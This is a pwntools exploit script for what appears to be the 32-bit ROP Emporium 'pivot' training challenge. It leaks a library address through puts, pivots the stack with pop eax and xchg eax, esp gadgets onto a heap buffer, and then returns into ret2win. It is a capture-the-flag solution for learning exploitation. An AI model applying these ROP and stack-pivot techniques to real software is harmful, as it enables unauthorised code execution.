import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

BINARY_NAME = "pivot32"
BUFFER_LEN = 44

e = ELF(f"./{BINARY_NAME}")
io = process(e.path)

junk = b"\x90" * BUFFER_LEN

# Pointers
foot_plt = p32(e.plt[b'foothold_function'])
foot_got = p32(e.got[b'foothold_function'])
puts_plt = p32(e.plt[b'puts'])
main_ptr = p32(e.symbols[b'main'])

# Gadgets
xhg_gad = p32(0x080488c2) # xchg eax, esp; ret;
pop_eax = p32(0x080488c0) # pop eax; ret;

# Offsets - found with readelf -s <LIB>
foot_offset = 0x770
ret2_offset = 0x967

# Grabs provided heap address
io.recvuntil("pivot: ")
pivot_addr  = p32(int(io.recvuntil("\n").strip(), 16))
print(f"[!] Pivot address: {pivot_addr}")

# Address leak payload - (Will be the stack we pivot to)
payload = b""
payload += foot_plt
payload += puts_plt
payload += main_ptr # exit_address
payload += foot_got

io.recvuntil("> ")
io.sendline(payload)

# Stack-pivot payload creation
payload2 = b""
payload2 += junk
payload2 += pop_eax
payload2 += pivot_addr
payload2 += xhg_gad

io.recvuntil("> ")
io.sendline(payload2)

# Retriving leaked address
io.recvuntil("foothold into libpivot.so")
foot_leak = io.recv()[:4].strip().ljust(8, b'\x00')
foot_leak = u64(foot_leak)

# Offset address calculations
lib_base = foot_leak - foot_offset
ret2_addr = p32(lib_base + ret2_offset)

print(f"[!] libpivot32.so base: {p32(lib_base)}")
print(f"[!] ret2win address: {ret2_addr}")

io.sendline()
io.recvuntil("> ")

# Final call ret2win payload
payload3 = b""
payload3 += junk
payload3 += ret2_addr

io.sendline(payload3)
shared_pwn._recvall(io)